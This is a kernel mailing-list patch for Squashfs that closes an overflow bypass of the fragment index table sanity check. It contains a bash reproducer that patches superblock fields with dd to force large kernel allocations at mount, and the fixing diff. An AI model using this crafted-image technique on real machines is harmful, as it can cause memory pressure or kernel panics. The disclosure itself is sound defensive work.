Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.40
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795405434;
	b=KfzD/O6C+pCMwubJ67LnSB2ucf8YEHKe7MX1DxA5YNzeIXrCfY6rikIMivq7jQwaODfV
	 /U+imuOoTkR6HYp5l0r62WxctsWzhKvmNcfse041tVmSYAef9sN8jL/0bdIRNN1Va6nTU
	 d1gc4Z+kn1wpmTM7iGKcs5KYW5vVqjKIeSEFeZKNoo7ArEVTAh/wHhCma0uARKzJIiSGS
	 uAET1FjbB/OANNZhrvkJMVkNdl3tCHd8zC3jVb0o6uPUQ61nDrsCbWJeMuEYr7vt8HXyp
	 U62to1bK/o/u4hCAgzbDljXz7BL6DwXM1kskAbCk9aHKbtb9o9QCEWqZgQHlNv6FxWg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795405434;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	b=VIw4g5rEkFqoWSgAVCNQVAYGfUM635AGgZ/6ODAb3OEWQr86FF7kW3XQ/OuXqESzWlPZ
	 YO9T8OkrVmHPAO43xAO+Q5+pGdIpsAfIstPBMSbLMe4p5/IM2H+hmgQlkEjeAnPQ43/Mi
	 G6Ptj1pmFVhE+S+Nfh+bM4yJKAFu94yWH6ddche6IjNjAQbNVYiHQw8mWDXBmeet8FJY1
	 b9QrVLCY37UazvsNNCz5jMxW2xEU5XMNAELfvYWqsl7P3wDzn6OGUrsxgQhasJxsguczH
	 LTnjhr1pwumvTvxBp54ULKhDsybVkDlGVlIZksSTDkrzsaqQPeSVEiW7JWZOn3IzuBA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=F06rRA2J;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=kuXPwLz7;
	arc=none smtp.remote-ip=188.121.53.40
Received: from sxplsmtpa04-04.prod.sxb1.secureserver.net (sxplsmtpa04-04.prod.sxb1.secureserver.net [188.121.53.40])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B1261606A6AE
	for <linux-kernel@vger.kernel.org>; Mon, 23 Nov 2026 03:43:53 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org B1261606A6AE
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=F06rRA2J;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=kuXPwLz7
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id VKxRxJoOeZuU3VKxvxiqQv; Mon, 23 Nov 2026 03:43:39 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1795405420;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=F06rRA2JB3307I+KC29BSXW5iz09MwURQP8yfJg1Is05XZ4i41wqdZGtmAeWs86jb
	 6nCf+NDLCV8Duvav/q87oqJLh4NBVL0xPCL9IEpDqwrPbmJiLCZx7dHSacD1dYCeor
	 hW4Y8S0f9jdA1Q5wPUGOLflVDUZaoTQiDeVzLZpbTFcrSXEb0g5GENqZ8xNYSpMyXL
	 ieVag2HT4N4Ei664vfxNwwbK5uyTAkrhn9L6OjovtSfIj4ooK1N50h3c9u0MX/4yTy
	 vmy56uf7HbLGalL7EvffwMgjB+9587r+iG0sxqhg6S4UXnf1HP2ZKtWcLAplY0irkr
	 3vzGfu/gatL/g==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1795405420;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=kuXPwLz7WissNqJF/9ZnoesTFosciYC+l8Hn5imhXnElFCNnbrNfXwTWbpeNZHpHV
	 bv4wmXp44f+VSbtssPXSsdK6g21ER1X+dIUibaDeD7UU/fulVi676FMvMyjEFN/OLe
	 Ri2YQaTjrSo7tnd/f/kR2hCHFWcRxS0N9a5RvYbMR338Ro9gZ8EBgceEwt+QimD960
	 ODF+phEoNB9eBLa7d2ClS6e5UBoijcwZcrd8BV5PIwwLc/jyVGaOcf7JyXES3csnIC
	 kUMzUhPhNmp5aVBDDqon/5y4TUJS+hL3LVY4zu96exjmK2sneLVtUKjDRWtwkS2FA4
	 RvKPABVT0uYDA==
X-CMAE-Analysis: v=2.4 cv=CvYq4X4D c=1 sm=1 tr=0 ts=6b03b66c
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=5M4-1oPrCebqpQMMblwA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: 4b1b760fde2071f74a918bc97cd69185:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: akpm@linux-foundation.org,
	linux-kernel@vger.kernel.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v3 10/23] Squashfs: fix fragment index table length too large exploit
Date: Mon, 23 Nov 2026 03:42:51 +0000
Message-ID: <20261123034304.261742-11-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261123034304.261742-1-phillip@squashfs.org.uk>
References: <20261123034304.261742-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfKS11Q7GhjjAieyObogY9+FFnHs+4wjcb64TuPPAGVTT6gAbKlHF7TaQNtGD5PM3WK3DITai2Yi3WDnbNR9ENqHMqOI5Dp8wPfwR5xXhjh5yMZGJnwIH
 r8hvH3eTQaIO7dNC7IIJZb8Bj1jUUzmgn9lY+mzxItSIhqsFuRNPeqA+JbTNCftclTlyH/SVtmMC3He0JVDtDj7XmyifdtkKbDbZ5EdX1W149COHRDYrJUtn
 t5VvNQIGi3B8bymfyCeNp5N5Q2YL9i7ZREfv/QA0rXDUPee2SRJY5YTXG3+/Uslc

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
 fs/squashfs/fragment.c | 8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

diff --git a/fs/squashfs/fragment.c b/fs/squashfs/fragment.c
index e945d045d55e..9f63e5b5c513 100644
--- a/fs/squashfs/fragment.c
+++ b/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_table(struct super_block *sb,
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
-- 
2.47.3

